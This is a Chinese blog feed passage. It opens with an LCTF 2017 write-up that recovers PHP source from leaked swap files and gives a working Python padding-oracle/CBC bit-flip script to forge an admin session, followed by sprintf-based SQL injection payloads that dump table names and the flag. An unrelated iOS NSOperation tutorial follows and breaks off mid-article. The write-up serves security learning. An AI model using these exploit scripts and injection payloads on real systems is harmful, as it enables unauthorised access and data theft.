                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-23%20%E4%B8%8B%E5%8D%889.20.08.png" alt="屏幕快照 2017-11-23 下午9.20.08.png" title="" class="">
                <p>屏幕快照 2017-11-23 下午9.20.08.png</p>
            </figure>
<h1 id="0X02-LCTF实战"><a href="#0X02-LCTF实战" class="headerlink" title="0X02-LCTF实战"></a>0X02-LCTF实战</h1><p>lctf一道simple blog，这一次crf的misc一道都没搞出来显然非常的惭愧，树莓派弯弯绕得太多，但是那个pdf却是吃了想当然的大亏，一直社工去了，这里说一道结合crypto的web题—simple blog:</p>
<p>首先我们可以通过源码泄漏去分析一下如何进行绕过之类的，我们可以在备份文件中找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://111.231.111.54/.login.php.swp</div><div class="line">http://111.231.111.54/.admin.php.swp</div></pre></td></tr></table></figure>
<p>下载下来之后可以使用<code>vim -r</code>恢复一下得到源码：</p>
<p>Login.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'省略'</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">	$password = $_POST[<span class="string">'password'</span>];</div><div class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">  		get_identity();</div><div class="line">  		header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">  	&#125;<span class="keyword">else</span>&#123;</div><div class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">  	&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>admin.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	$result = mysql_query($sql,$con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">		<span class="keyword">die</span>();</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="comment">//下面为登陆成功之后的HTML代码</span></div></pre></td></tr></table></figure>
<p>通过源码分析我们很容易看出这就是一个CBC翻转攻击，将token作为了IV,也就是说token在cookie中，是可控的，我们可以进行Padding Oracle Attack，通过修改<code>$token</code>可以把<code>$_SESSION[&#39;isadmin&#39;]</code>改为1。这里丢一个python的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="comment">#目的IP</span></div><div class="line">url=<span class="string">'http://111.231.111.54/login.php'</span></div><div class="line"><span class="comment">#在AES加密中使用的是十六字节的分组长度</span></div><div class="line">N=<span class="number">16</span></div><div class="line"></div><div class="line"><span class="comment">#利用IV进行攻击</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></div><div class="line">    header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+phpsession+<span class="string">";token="</span>+token&#125;</div><div class="line">    result=requests.post(url,headers=header)</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"><span class="comment">#做异或运算</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</div><div class="line"></div><div class="line"><span class="comment">#填充明文</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></div><div class="line">    l=len(string)</div><div class="line">    <span class="keyword">if</span> l!=N:</div><div class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</div><div class="line"></div><div class="line"><span class="comment">#得到除了首位外的middle text</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></div><div class="line">    <span class="comment">#middle text</span></div><div class="line">    get=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            <span class="comment">#利用异或的特性得到已经求得的IV</span></div><div class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))</div><div class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</div><div class="line">            result=inject_token(base64.b64encode(c))</div><div class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                get=chr(j^i)+get</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> get</div><div class="line"></div><div class="line"><span class="comment">#得到原token和session</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="comment">#弱口令</span></div><div class="line">    payload = &#123;</div><div class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</div><div class="line">        <span class="string">"password"</span>:<span class="string">"admin"</span></div><div class="line">    &#125;</div><div class="line">    coo1 = &#123;</div><div class="line">        <span class="string">"PHPSESSID"</span>:<span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    &#125;</div><div class="line">    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=<span class="keyword">False</span>)</div><div class="line">    <span class="comment">#对返回的原始token进行一次urldecode</span></div><div class="line">    token = r.headers[<span class="string">'Set-Cookie'</span>].replace(<span class="string">"%3D"</span>,<span class="string">'='</span>).replace(<span class="string">"%2F"</span>,<span class="string">'/'</span>).replace(<span class="string">"%2B"</span>,<span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</div><div class="line">    session = <span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    <span class="keyword">return</span> session, token</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    phpsession,token = login(url)</div><div class="line">    middle1=padding_oracle(N)</div><div class="line">    <span class="keyword">print</span> middle1</div><div class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></div><div class="line">  	<span class="comment">#在这里只能爆出15位，最后一位需要自己手爆</span></div><div class="line">    <span class="keyword">if</span>(len(middle1)+<span class="number">1</span>==<span class="number">16</span>):</div><div class="line">        <span class="comment">#爆破最后一位middle text</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            middle=chr(i)+middle1</div><div class="line">            <span class="keyword">print</span> <span class="string">"token:"</span>+token</div><div class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span>+middle</div><div class="line">            plaintext=xor(middle,token);</div><div class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span>+plaintext</div><div class="line">            <span class="comment">#对明文进行填充</span></div><div class="line">            des=pad(<span class="string">'admin'</span>,N)</div><div class="line">            <span class="comment">#初始化攻击token</span></div><div class="line">            tmp=<span class="string">""</span></div><div class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</div><div class="line">            <span class="comment">#利用xor的特性得到攻击token</span></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</div><div class="line">                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))</div><div class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</div><div class="line">            result=inject_token(base64.b64encode(tmp))</div><div class="line">            <span class="comment">#对攻击之后的返回页面做判断</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"Login Form"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content <span class="keyword">and</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                <span class="keyword">print</span> result.content</div><div class="line">                <span class="keyword">print</span> <span class="string">"success"</span></div><div class="line">                exit()</div></pre></td></tr></table></figure>
<p>运行之后就可以将<code>isadmin</code>的值置一，接下来就成功进入<code>admin.php</code>，可以到这里还没完，显然还存在一个<code>SQL注入</code>的漏洞。乍看一下因为有<code>mysql_real_escape_string()</code>，也没找到一个<code>0Day</code>去打，后来发现居然是今年新的洞，还是自己孤陋寡闻了，主要是利用了php中spritf函数的特性造成单引号逃逸，格式化字符串简单的利用，在PHP的<code>sprintf</code>这个函数中<code>%\</code>会被当成一个格式化字符串，如图 ：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-23%20%E4%B8%8B%E5%8D%888.49.07.png" alt="屏幕快照 2017-11-23 下午8.49.07.png" title="" class="">
                <p>屏幕快照 2017-11-23 下午8.49.07.png</p>
            </figure>
<p>可以看到<code>%\</code>和<code>%y</code>一样被当做了一个不存在的类型的格式化字符串，所以输出为空</p>
<p>所以利用这个原理，我们可以传入<code>title=%&#39; or 1#</code>，此时因为<code>mysql_real_escape_string()</code>的存在单引号前会被加上一个<code>\</code>，那么最后拼接到语句里就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' AND title='%\' or 1#'"</span>, $id);</div></pre></td></tr></table></figure>
<p>这样<code>%</code>就会吃掉后面的<code>\</code>组成一个格式化字符串，单引号就成功逃逸了出来。</p>
<p>但是只是这样的话还是会报错参数不足，因为这条代码里有两个格式化字符串但是只有一个参数。不过PHP的格式化字符串还有另一种表示方法<code>%1$s</code>，其中<code>%</code>后面的数字就表示引用第几个参数，<code>$</code>后面是格式化字符串的类型，如图 ：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-23%20%E4%B8%8B%E5%8D%888.50.16.png" alt="屏幕快照 2017-11-23 下午8.50.16.png" title="" class="">
                <p>屏幕快照 2017-11-23 下午8.50.16.png</p>
            </figure>
<p>这样title那里引用的也是第一个参数<code>$id</code>，就不会报参数不足的错了</p>
<p>具体的原理可以看<a href="https://paper.seebug.org/386/" target="_blank" rel="external">这篇文章</a></p>
<p>所以最终SQL注入的payload就是：<code>?id=0&amp;title=%251%24&#39;%20union%20select%201%2C2%2C3%23</code></p>
<p>最后结合上面的使用一个脚本就可以跑出整个flag了，也就是在最后的判断的时候修改一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#登陆成功之后就会变成bootstrap.css了，以这个作为判断条件</span></div><div class="line"><span class="keyword">if</span> <span class="string">"css/login.css"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                <span class="comment">#payload = "%1$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#"  #注表名</span></div><div class="line">                <span class="comment">#payload = "%1$' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x4b4559#"    #注列名</span></div><div class="line">                payload = <span class="string">"%1$' union select 1,2,f14g from `key`#"</span> <span class="comment">#注字段</span></div><div class="line">                params = &#123;<span class="string">'id'</span>: <span class="string">'0'</span>, <span class="string">'title'</span>: payload&#125;</div><div class="line">                r = s.get(<span class="string">"http://111.231.111.54/admin.php"</span>, params = params)</div><div class="line">                <span class="keyword">print</span> r.content</div><div class="line">                <span class="keyword">print</span> <span class="string">"success"</span></div><div class="line">                exit()</div></pre></td></tr></table></figure>
<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md" target="_blank" rel="external">官方writeup</a></p>
<p><a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="external">我对Padding Oracle攻击的分析和思考</a></p>
<p><a href="http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html" target="_blank" rel="external">CBC字节翻转攻击介绍</a></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS多线程之NSOperation]]></title>
      <url>/2017/11/14/iOS%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B9%8BNSOperation/</url>
      <content type="html"><![CDATA[<p>之前的博客中说了GCD，GCD固然是一套强大的多线程解决方案，能够解决绝大多数的多线程问题，但是他易于上手难于精通且到处是坑的特点也注定了想熟练使用它有一定的难度。<br>在现在的主流开发模式下，用到多线程的绝大多数就是网络数据请求和网络图片加载，这两点上AFNetwork+SDWebImage（两个主流框架）已经能满足几乎所有的需求。而剩下的一小部分，简单好用的NSOperation无疑是比GCD更有优势的。</p>
<a id="more"></a>
<h2 id="NSOperation介绍"><a href="#NSOperation介绍" class="headerlink" title="NSOperation介绍"></a>NSOperation介绍</h2><p>和GCD一样，NSOperation也是苹果提供给我们的一套多线程解决方案。实际上也是基于GCD开发的，但是比GCD的可控性和代码可读性更强（相信GCD那种风格的代码新手都不太习惯）。</p>
<p>NSOperation是一个<strong>抽象基类</strong>，没有什么实际使用的价值，所以我们必须要使用它的子类：</p>
<ol>
<li>NSInvocationOperation</li>
<li>NSBlockOperation</li>
<li>自定义子类继承NSOperation，实现内部的方法</li>
</ol>
<p>下面就来简单的介绍一下NSOperation及其子类的基本使用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">NSOperation * operation = [[NSOperation alloc]init];</div><div class="line">//开始执行</div><div class="line">[operation start];</div><div class="line">//取消执行</div><div class="line">[operation cancel];</div><div class="line">//执行结束后调用的Block</div><div class="line">[operation setCompletionBlock:^&#123;</div><div class="line">    NSLog(@&quot;执行结束&quot;);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//NSInvocationOperation和NSthread的操作有点类似，都是通过绑定事件</div><div class="line">//创建</div><div class="line">NSInvocationOperation * invo = [[NSInvocationOperation alloc]initWithTarget:self selector:@selector(testNSInvocationOperation) object:nil];</div><div class="line">//启动</div><div class="line">[invo start];</div><div class="line">//但是不会这样使用，都是配合队列使用</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//NSBlockOperation有一点特殊，是可以直接实现多线程的</div><div class="line">NSBlockOperation * blockOperation = [[NSBlockOperation </div><div class="line">blockOperationWithBlock:^&#123;</div><div class="line">   NSLog(@&quot;1在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div><div class="line">[blockOperation addExecutionBlock:^&#123;</div><div class="line">  NSLog(@&quot;2在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div><div class="line">[blockOperation addExecutionBlock:^&#123;</div><div class="line">  NSLog(@&quot;3在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div><div class="line">[blockOperation addExecutionBlock:^&#123;</div><div class="line">  NSLog(@&quot;4在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div><div class="line">[blockOperation addExecutionBlock:^&#123;</div><div class="line">  NSLog(@&quot;5在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div><div class="line">[blockOperation addExecutionBlock:^&#123;</div><div class="line">  NSLog(@&quot;6在第%@个线程&quot;,[NSThread currentThread]);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>首先看看执行之后的结果：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-06%20%E4%B8%8B%E5%8D%884.55.05.png" alt="屏幕快照 2017-10-06 下午4.55.05.png" title="" class="">
                <p>屏幕快照 2017-10-06 下午4.55.05.png</p>
            </figure></p>
<p>从结果中我们可以分析NSBlockOperation确实实现了多线程，但是它并非是将所有的block都放到放到了子线程中。</p>
<p>通过上面的打印记录我们可以发现，它会优先将block放到主线程中执行，若主线程已有待执行的代码，就开辟新的线程，但最大并发数为4（包括主线程在内，真机测试上不同）。如果block数量大于了4，那么剩下的Block就会等待某个线程空闲下来之后被分配到该线程，且依然是优先分配到主线程。</p>
<h2 id="NSOperation中的队列"><a href="#NSOperation中的队列" class="headerlink" title="NSOperation中的队列"></a>NSOperation中的队列</h2><p>在GCD中我们就学过有串行队列和并发队列，并且有主队列和全局并发队列。而在NSOperation中就显得简单了许多，只有主队列和非主队列：</p>
<ol>
<li>主队列：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[NSOperationQueue mainQueue] //和GCD中的主队列一样</div></pre></td></tr></table></figure>
<ol>
<li>非主队列</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[NSOperationQueue alloc] init] //非常特殊（同时具备并发和串行的功能），默认情况下非主队列为并发队列</div></pre></td></tr></table></figure>
<ol>
<li>队列操作</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">//添加操作到队列</div><div class="line">NSInvocationOperation *op1 = [[NSInvocationOperation alloc]initWithTarget:self selector:@selector(testNSInvocationOperation) object:nil];</div><div class="line">[queue addOperation:op1];</div></pre></td></tr></table></figure>
<ol>
<li>添加任务简化方法</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//相比于之前在操作中添加任务的繁琐方式，和GCD一样，我们也有简化版</div><div class="line">NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">[queue addOperationWithBlock:^&#123;</div><div class="line">    NSLog(@&quot;7-------@&quot;, [NSThread currentThread]);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<h2 id="自定义NSOperation"><a href="#自定义NSOperation" class="headerlink" title="自定义NSOperation"></a>自定义NSOperation</h2><p>之前说过NSOperation是一个抽象基类，我们可以通过自定义类继承的方式来实现多线程，但是既然我们已经拥有上面两种实现多线程的方式了，那么为什么我们还需要去使用这个自定义类呢？下面就来看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">//1.有利于代码的隐蔽，做一次封装</div><div class="line">//2.有利于代码的复用性</div><div class="line"></div><div class="line">//在自定义类内部，告知要执行的任务</div><div class="line">- (void)main&#123;</div><div class="line">    NSLog(@&quot;main ---%@&quot;, [NSThread currentThread]);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//这个时候在其他类中如果要使用的话就只需要初始化一下就行了，就不需要把同一份代码到处用</div><div class="line">- (void)customWithQueue&#123;</div><div class="line">    XMGOperation *op1 = [[XMGOperation alloc] init];</div><div class="line">  	XMGOperation *op2 = [[XMGOperation alloc] init];</div><div class="line">  </div><div class="line">  	NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">  	[queue addOperation:op1];</div><div class="line">    [queue addOperation:op2];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么NSOperation还有什么其他的用法呢，不然如何与大名鼎鼎的GCD匹敌呢？下面就说说线程的暂停、恢复，取消和最大并发数：</p>
